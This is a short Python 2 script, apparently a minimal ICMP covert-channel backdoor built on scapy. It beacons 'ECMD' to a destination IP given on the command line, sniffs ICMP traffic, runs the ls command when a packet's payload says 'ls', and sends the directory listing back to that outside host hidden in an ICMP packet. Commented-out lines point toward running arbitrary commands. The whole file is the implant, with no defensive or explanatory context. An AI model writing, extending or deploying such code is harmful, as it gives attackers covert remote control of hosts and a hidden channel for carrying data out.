from scapy.all import *
import subprocess
import sys

interface = sys.argv[1]
dstip = sys.argv[2]

def pkt_callback(pkt):
#    pkt.show() # debug statement
    if pkt[Raw].load == "ls":
        process = subprocess.Popen(['ls'], stdout=subprocess.PIPE)
        out, err = process.communicate()
        print out

        #print "Enter command to execute:"
        #cmd = raw_input()
        packet = IP(dst=dstip)/ICMP()/out
        send(packet)
        #packet.show()
#       print pkt[Raw].load

packet = IP(dst=dstip)/ICMP()/"ECMD"
send(packet)
packet.show()

sniff(iface=interface, prn=pkt_callback, filter="icmp", store=0)
